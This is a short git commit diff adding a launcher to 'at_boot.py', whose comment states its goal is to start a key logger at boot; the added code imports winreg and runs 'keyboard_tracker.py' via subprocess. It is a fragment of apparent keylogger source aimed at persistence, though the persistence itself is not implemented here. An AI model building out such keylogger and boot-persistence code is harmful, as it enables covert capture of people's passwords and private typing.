8a6cd633e326dbdebbcffbe22165cabca898a338
Sidd <siddharthg1703@gmail.com>
2024-12-30 18:01:06 +0530

    Opening tracker without using tracker

--- at_boot.py
+++ at_boot.py
@@ -1,2 +1,11 @@
 #goal of this file is to start the key logger at boot
 import os
+import sys
+import winreg as reg
+
+from subprocess import call
+
+def open_tracer():
+    call(["python", "keyboard_tracker.py"])
+
+open_tracer()
